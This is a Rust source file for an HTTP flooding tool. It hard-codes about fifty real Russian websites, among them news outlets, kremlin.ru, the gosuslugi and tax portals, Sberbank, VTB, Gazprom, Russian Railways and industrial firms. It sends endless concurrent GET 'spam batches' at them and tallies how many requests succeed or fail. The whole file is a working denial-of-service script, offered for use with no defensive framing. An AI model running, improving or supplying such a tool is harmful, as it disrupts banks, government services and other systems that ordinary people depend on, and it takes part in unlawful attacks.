use std::{
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc,
    },
    time::Duration,
};

use clap::Parser;

use futures::StreamExt;
use reqwest::{Client, Error, Response};

const TARGETS: &'static [&'static str] = &[
    "https://lenta.ru/",
    "https://ria.ru/",
    "https://ria.ru/lenta/",
    "https://www.rbc.ru/",
    "https://www.rt.com/",
    "http://kremlin.ru/",
    "http://en.kremlin.ru/",
    "https://smotrim.ru/",
    "https://tass.ru/",
    "https://tvzvezda.ru/",
    "https://vsoloviev.ru/",
    "https://www.1tv.ru/",
    "https://www.vesti.ru/",
    "https://online.sberbank.ru/",
    "https://sberbank.ru/",
    "https://zakupki.gov.ru/",
    "https://www.gosuslugi.ru/",
    "https://er.ru/",
    "https://www.rzd.ru/",
    "https://rzdlog.ru/",
    "https://vgtrk.ru/",
    "https://www.interfax.ru/",
    "https://www.mos.ru/uslugi/",
    "http://government.ru/",
    "https://mil.ru/",
    "https://www.nalog.gov.ru/",
    "https://customs.gov.ru/",
    "https://pfr.gov.ru/",
    "https://rkn.gov.ru/",
    "https://www.gazprombank.ru/",
    "https://www.vtb.ru/",
    "https://www.gazprom.ru/",
    "https://lukoil.ru",
    "https://magnit.ru/",
    "https://www.nornickel.com/",
    "https://www.surgutneftegas.ru/",
    "https://www.tatneft.ru/",
    "https://www.evraz.com/ru/",
    "https://nlmk.com/",
    "https://www.sibur.ru/",
    "https://www.severstal.com/",
    "https://www.metalloinvest.com/",
    "https://nangs.org/",
    "https://rmk-group.ru/ru/",
    "https://www.tmk-group.ru/",
    "https://ya.ru/",
    "https://www.polymetalinternational.com/ru/",
    "https://www.uralkali.com/ru/",
    "https://www.eurosib.ru/",
    "https://ugmk.ua/",
    "https://omk.ru/",
];

struct Target {
    url: &'static str,
    request_count: AtomicUsize,
    failed_count: AtomicUsize,
}

fn process_targets() -> Vec<Arc<Target>> {
    TARGETS
        .iter()
        .map(|url| Target {
            url,
            request_count: 0.into(),
            failed_count: 0.into(),
        })
        .map(|target| Arc::new(target))
        .collect()
}

impl Target {
    async fn ping(&self, client: &Client) -> Result<Response, Error> {
        let request = client.get(self.url).build().unwrap();
        self.request_count.fetch_add(1, Ordering::Relaxed);
        let response = client.execute(request).await;
        match &response {
            Ok(res) => if res.status().is_server_error() {
                self.failed_count.fetch_add(1, Ordering::Relaxed);
            },
            _ => {
                self.failed_count.fetch_add(1, Ordering::Relaxed);
                ()
            },
        };
        response
    }

    fn print(&self) {
        println!(
            "{}, {}, {}",
            self.url,
            self.request_count.load(Ordering::Relaxed),
            self.failed_count.load(Ordering::Relaxed)
        );
    }
}

#[derive(Parser)]
struct Args {
    /// Amount of spam batches per result print (more = more efficient)
    #[clap(short, long, default_value_t = 20)]
    pub count: usize,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let targets = process_targets();
    let client = reqwest::ClientBuilder::new()
        .timeout(Duration::from_secs(1))
        .build()
        .unwrap();
    let mut futures = futures::stream::futures_unordered::FuturesUnordered::new();
    loop {
        for target in targets.iter().cycle().take(targets.len() * args.count) {
            futures.push(target.ping(&client));
        }
        while !futures.is_empty() {
            futures.next().await;
        }
        for target in targets.iter() {
            target.print();
        }
    }
}
